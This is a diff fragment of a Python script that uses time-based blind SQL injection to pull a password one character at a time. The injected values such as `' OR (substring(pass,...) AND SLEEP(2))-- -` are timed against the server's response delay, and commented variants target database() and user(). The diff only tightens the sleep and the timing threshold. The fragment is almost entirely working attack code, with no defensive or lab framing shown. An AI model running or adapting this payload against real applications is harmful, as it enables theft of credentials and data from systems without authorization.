@@ -15,7 +15,7 @@ for i in range(100):
 #        statement =f"SELECT substr(database(),1,{len(value)+1})='{value + chr}'"
         statement =f"substring(pass,1,{len(value) + 1})='{value + chr}'"
 #        statement =f"SELECT substr(user(),1,{len(value)+1})='{value + chr}'"
-        user = f"' OR ({statement} AND SLEEP(4))-- -" # True = 2 sec false = .2 sec
+        user = f"' OR ({statement} AND SLEEP(2))-- -" # True = 2 sec false = .2 sec
         print(user)
 
         params = {
@@ -29,7 +29,7 @@ for i in range(100):
         delta = end_time - start_time
 #        print(delta)
 #        print(r.status_code)
-        if delta > 4:
+        if delta > 2:
             value += chr
             break
 
